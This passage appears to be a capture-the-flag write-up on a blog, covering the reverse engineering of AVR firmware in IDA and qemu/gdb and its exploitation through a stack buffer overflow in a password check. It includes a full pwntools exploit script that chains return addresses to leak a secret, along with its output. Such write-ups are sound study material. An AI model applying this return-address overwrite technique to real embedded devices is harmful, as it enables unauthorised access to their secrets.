+</span></span><span style="display:flex;"><span>00000050: <span style="color:#ae81ff">7365</span> <span style="color:#ae81ff">6372</span> <span style="color:#ae81ff">6574</span> <span style="color:#ae81ff">2043</span> <span style="color:#ae81ff">5243</span> 0d0a <span style="color:#ae81ff">0057</span> <span style="color:#ae81ff">7269</span>  secret CRC...Wri
+</span></span><span style="display:flex;"><span>00000060: <span style="color:#ae81ff">7469</span> 6e67 <span style="color:#ae81ff">2043</span> <span style="color:#ae81ff">5243</span> <span style="color:#ae81ff">2074</span> 6f20 <span style="color:#ae81ff">4545</span> <span style="color:#ae81ff">5052</span>  ting CRC to EEPR
+</span></span><span style="display:flex;"><span>00000070: 4f4d 202e 2e2e 0d0a 004b 4f20 3a2d <span style="color:#ae81ff">2820</span>  OM ......KO :-<span style="color:#f92672">(</span> 
+</span></span><span style="display:flex;"><span>00000080: <span style="color:#ae81ff">4261</span> <span style="color:#ae81ff">6420</span> <span style="color:#ae81ff">7061</span> <span style="color:#ae81ff">7373</span> 776f <span style="color:#ae81ff">7264</span> 202e 2e2e  Bad password ...
+</span></span><span style="display:flex;"><span>00000090: 0d0a <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
+</span></span></code></pre></div><p>We can finally load the RAM file (<code>File-&gt;Load file-&gt;Additional binary file</code>). Choose the right options when adding the segment:
+<img alt="additional binary file prompt" src="/img/pwn-hackropole_pwnduino/create-RAM.png"></p>
+<p>Then modify the created segment in <code>View-&gt;Open subviews-&gt;Segments</code> and add the extra space for registers before RAM content (also change segment class and optionally the segment name).
+<img alt="extend RAM with regs" src="/img/pwn-hackropole_pwnduino/modif-RAM.png"></p>
+<p>Good job ! Now we are able to look at the resolved address in RAM. Let&rsquo;s confirm it. Go to the <code>main</code> function and locate the first call to <code>uart_puts</code> (address <code>0x226</code>). You can see setup the arguments in <code>r24:r25</code> which holds the RAM address of the string to display (<code>0x0200</code>). Jump to this location by pressing <code>G</code> and entering <code>RAM:0x200</code>, you should see the string <code>&quot;=== Welcome!&quot;</code> (eventually press <code>A</code> on the address to convert data to string)</p>
+<h4 id="reversing">Reversing<a href="#reversing" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>You can find <a href="/firmware_debug.bin.i64.tgz">here</a> the IDA database of the firmware, I have already identified and renamed all the functions, but you can also compile the <code>elf</code> firmware binary from the <code>public</code> dir, and load this one into IDA (it will already have all functions renamed and memory layout correctly mapped)</p>
+<p>We now want to know exactly how many bytes the <code>passwd_check</code> function allocates and what is the stack layout. If we look at the function prologue, we see it pushes previous FP and allocates 24 bytes, and then it calls <code>memset(buff, 0, sizeof(buff))</code>. We can see here that the <code>buff</code> variable is located at <code>Y+8</code>, but we can see in avr-gcc documentation that stack top (they use bottom term instead) is located at <code>Y+1</code>. Thus the buffer is located at <code>SP+7</code>, and is 19 bytes from the return address ((24+2)-7).</p>
+<p><img alt="passwd_check function prologue" src="/img/pwn-hackropole_pwnduino/passwd_check-prologue.png"></p>
+<p>Now we need to know how many bytes is the return address. As I didn&rsquo;t achieve to find this information on internet, I ended up determining this using dynamic analysis. We will setup a debugging environment with qemu.</p>
+<p>Install <code>avr-gcc</code>, <code>avr-libc</code>, <code>avr-gdb</code> and <code>qemu-system-avr</code>, then compile the firmware elf and run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-avr -M mega2560 -bios firmware_debug.elf -nographic -serial tcp::1337,server<span style="color:#f92672">=</span>on,wait<span style="color:#f92672">=</span>off -s -S
+</span></span></code></pre></div><p>I found the command on the internet. From what I understood with documentation, it emulates the firmware, redirect serial I/O to tcp port <code>1337</code>, starts gdb server on port <code>1234</code> (<code>-s</code>) and halt the CPU on startup (<code>-S</code>).</p>
+<p>We can now debug the firmware with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ avr-gdb -q ./firmware_debug.elf 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> target remote :1234
+</span></span><span style="display:flex;"><span>Remote debugging using :1234
+</span></span><span style="display:flex;"><span>warning: Target-supplied registers are not supported by the current architecture
+</span></span><span style="display:flex;"><span>0x00000000 in __vectors <span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>Add a breakpoint on <code>passwd_check</code> stack cleanup epilogue (disas the function in gdb and locate the <code>cli</code> instruction at the end), then continue execution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *0x00000428
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x800428
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> c
+</span></span></code></pre></div><p>Let&rsquo;s check the stack to see the return address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
+</span></span><span style="display:flex;"><span>0x000001fa in uart_get <span style="color:#f92672">()</span> at uart.c:27
+</span></span><span style="display:flex;"><span>27		<span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>!<span style="color:#f92672">(</span>UCSR0A &amp; <span style="color:#f92672">(</span>1&lt;&lt;RXC0<span style="color:#f92672">)))</span> <span style="color:#f92672">{}</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> bt
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0  0x000001fa in uart_get () at uart.c:27</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#1  0x00000376 in passwd_check () at main.c:45</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#2  0x0000045c in main () at main.c:66</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> frame <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#1  0x00000376 in passwd_check () at main.c:45</span>
+</span></span><span style="display:flex;"><span>45			buff<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> uart_get<span style="color:#f92672">()</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/30xh $sp
+</span></span><span style="display:flex;"><span>0x8021dc:	0x00bb	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000
+</span></span><span style="display:flex;"><span>0x8021ec:	0x0000	0x0000	0x0000	0x0000	0x2100	0x00f9	0x2e02	0x2100
+</span></span><span style="display:flex;"><span>0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
+</span></span></code></pre></div><p>Remember called address is not the same as memory address. Thus, divide the frame return address by 2 (<code>hex(0x45c // 2) == 0x22e</code>. We can see that FP, which is located just above return address, would be <code>0xf900</code> if return address was 2 bytes, which is an invalid stack frame pointer. It makes much more sense to think return address is 3 bytes, as FP would be <code>0x21f9</code> in this case (remember that stack base is <code>0x21ff</code>).</p>
+<p>Now, continue the process in gdb and write some data to UART (not too much, stack frame is close to the stack base), then check the stack layout after the <code>cli</code> instruction.</p>
+<p>In shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat exec:<span style="color:#e6db74">&#34;python3 -c \&#34;print(&#39;A&#39;*19 + &#39;BBCC&#39;)\&#34;&#34;</span> tcp:localhost:1337
+</span></span></code></pre></div><p>Check back the stack to see <code>&quot;BBC&quot;</code> (<code>0x424243</code>) get written to the return address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Program received signal SIGTRAP, Trace/breakpoint trap.
+</span></span><span style="display:flex;"><span>0x00000428 in passwd_check <span style="color:#f92672">()</span> at main.c:57
+</span></span><span style="display:flex;"><span>57	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/30xh $sp
+</span></span><span style="display:flex;"><span>0x8021dc:	0x11bb	0x5900	0x0b00	0x0001	0x4141	0x4141	0x4141	0x4141
+</span></span><span style="display:flex;"><span>0x8021ec:	0x4141	0x4141	0x4141	0x4141	0x4141	0x4241	0x4342	0x0043
+</span></span><span style="display:flex;"><span>0x8021fc:	0x00ff	0x9d00	Cannot access memory at address 0x802200
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> 
+</span></span></code></pre></div><p>Now that we know how many bytes to overflow and how many bytes is the return address. Let&rsquo;s build the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;avr&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span>  <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;big&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Target host&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Target port&#39;</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>host
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    get_secret_address_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x169</span>
+</span></span><span style="display:flex;"><span>    uart_puts_p_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x135</span> 
+</span></span><span style="display:flex;"><span>    reset_handler_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p16(get_secret_address_ea)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p16(uart_puts_p_ea)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># uncomment following line to correctly terminate exploit</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># it is not prepended with b&#39;\x00&#39; because the &#39;\n&#39; sent</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># by `sendline` will be overwritten by the program with a </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># null byte, we cannot inject it ourself because it would</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># write the &#39;\n&#39; out of stack memory limit</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#payload += p16(reset_handler_ea)   </span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;flag:&#39;</span>, ans<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;flag:&#39;</span>, ans)
+</span></span></code></pre></div><p>Running it give us the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py localhost <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to localhost on port 4000: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to localhost port <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>flag: FCSC<span style="color:#f92672">{</span>__REDACTED__<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/pwn-dvar/" class="button inline prev">
+        PWN: Exploiting Vulnerable ARM Router
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/pwn_hackropole-armory/" class="button inline next">
+        PWN: Basic ARM Stack Buffer Overflow
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
